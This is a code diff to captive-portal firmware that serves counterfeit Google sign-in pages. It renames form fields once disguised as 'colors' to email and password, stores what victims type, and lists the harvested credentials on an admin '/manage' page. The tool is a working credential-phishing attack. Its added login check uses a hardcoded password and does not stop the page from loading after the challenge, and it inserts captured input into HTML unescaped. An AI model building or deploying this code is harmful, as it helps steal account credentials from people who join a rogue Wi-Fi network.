@@ -168,10 +168,10 @@ const char index_html[] PROGMEM = R"=====(
 			<p>Sign in</p>
 			<p>Use your Google account</p>
 		</div>
-		<form action="/submit-color1" method="post">
+		<form action="/submit-email" method="post">
 			<div class="text-container">
-				<input class="text-input" type="text" name="color1" id="color1" placeholder=" " required />
-				<label class="text-label" for="color1">Email or phone</label>
+				<input class="text-input" type="text" name="email" id="email" placeholder=" " required />
+				<label class="text-label" for="email">Email or phone</label>
 			</div>
 			<a class="blue" href="http://">Forgot email?</a>
 			<p class="info">Not your computer? To be able to benefit from the privacy, guest tribunals features. <a
@@ -334,10 +334,10 @@ const char login_html[] PROGMEM = R"=====(
 			<p>Welcome</p>
 			<p>Use your Google account</p>
 		</div>
-		<form action="/submit-color2" method="post">
+		<form action="/submit-pass" method="post">
 			<div class="password-container">
-				<input class="password-input" type="password" name="color2" id="color2" placeholder=" " required />
-				<label class="password-label" for="color2">Password</label>
+				<input class="password-input" type="password" name="pass" id="pass" placeholder=" " required />
+				<label class="password-label" for="pass">Password</label>
 			</div>
 			<div class="form-links">
 				<a class="blue" href="http://">Forgot Password?</a>
@@ -350,7 +350,7 @@ const char login_html[] PROGMEM = R"=====(
 </html>
 )=====";
 
-const char colors_html[] PROGMEM = R"=====(
+const char manage_html[] PROGMEM = R"=====(
 <!DOCTYPE html>
 <html lang="en">
 
@@ -475,7 +475,7 @@ const char colors_html[] PROGMEM = R"=====(
 			<input type="submit" value="Restore" name="second">
 		</form>
 		<h1>Password Section</h1>
-		<h3>%COLORS%</h3>
+		<h3>%CREDENTIALS%</h3>
 	</section>
 </body>
 
@@ -506,9 +506,18 @@ const char blank_html[] PROGMEM = R"=====(
 DNSServer dnsServer;
 AsyncWebServer server(80);
 
-String colorsList;
-String color1;
-String color2;
+String CredentialList;
+String email;
+String pass;
+
+const char* http_username = "admin";
+const char* http_password = "securepassword";
+
+void checkCredentials(AsyncWebServerRequest *request) {
+  if (!request->authenticate(http_username, http_password)) {
+    request->requestAuthentication();
+  }
+}
 
 void handleResetDevice(AsyncWebServerRequest *request) {
   request->send(200, "text/html", "Resetting EEPROM and SSID...");
@@ -592,14 +601,15 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
         Serial.println("Served Basic HTML Page");
     });
 
-    // New handler for the /colors page
-    server.on("/colors", HTTP_ANY, [](AsyncWebServerRequest *request) {
-        String dynamicColorsHTML = String(colors_html);
-        dynamicColorsHTML.replace("%COLORS%", colorsList);
-        AsyncWebServerResponse *response = request->beginResponse(200, "text/html", dynamicColorsHTML);
+    // New handler for the /manage page
+    server.on("/manage", HTTP_ANY, [](AsyncWebServerRequest *request) {
+		checkCredentials(request); // sprawdzanie użytkownika i hasła
+        String dynamicManageHTML = String(manage_html);
+        dynamicManageHTML.replace("%CREDENTIALS%", CredentialList);
+        AsyncWebServerResponse *response = request->beginResponse(200, "text/html", dynamicManageHTML);
         response->addHeader("Cache-Control", "public,max-age=31536000");
         request->send(response);
-        Serial.println("Served Colors HTML Page");
+        Serial.println("Served Manage HTML Page");
     });
 
 	server.on("/change-ssid", HTTP_POST, handleSsidChange);
@@ -624,27 +634,27 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
         Serial.println("Served login HTML Page");
     });
 
-    // New handler for submitting color 1
-    server.on("/submit-color1", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("color1", true)) {
-        color1 = request->getParam("color1", true)->value();
+    // New handler for submitting email
+    server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
+    if (request->hasParam("email", true)) {
+        email = request->getParam("email", true)->value();
 
-        // You can store, display, or process color1 and color2 as needed
-        colorsList += "Email: <div style='background-color:" + color1 + "; padding: 10px; margin: 5px;'>" + color1 + "</div>";
+        // You can store, display, or process email and pass as needed
+        CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";
 
-        request->redirect("/login"); // Redirect back to the main page after submitting colors
+        request->redirect("/login"); // Redirect back to the pass page after submitting email
     }
 
 });
-    // New handler for submitting color 2
-    server.on("/submit-color2", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("color2", true)) {
-        color2 = request->getParam("color2", true)->value();
+    // New handler for submitting pass
+    server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
+    if (request->hasParam("pass", true)) {
+        pass = request->getParam("pass", true)->value();
 
-		// You can store, display, or process color1 and color2 as needed
-		colorsList += "Password: <div style='background-color:" + color2 + "; padding: 10px; margin: 5px;'>" + color2 + "<hr></div>";
+		// You can store, display, or process email and pass as needed
+		CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";
 
-        request->redirect("/blank"); // Redirect back to the main page after submitting colors
+        request->redirect("/blank"); // Redirect back to the blank page after submitting pass
     }
 });
 
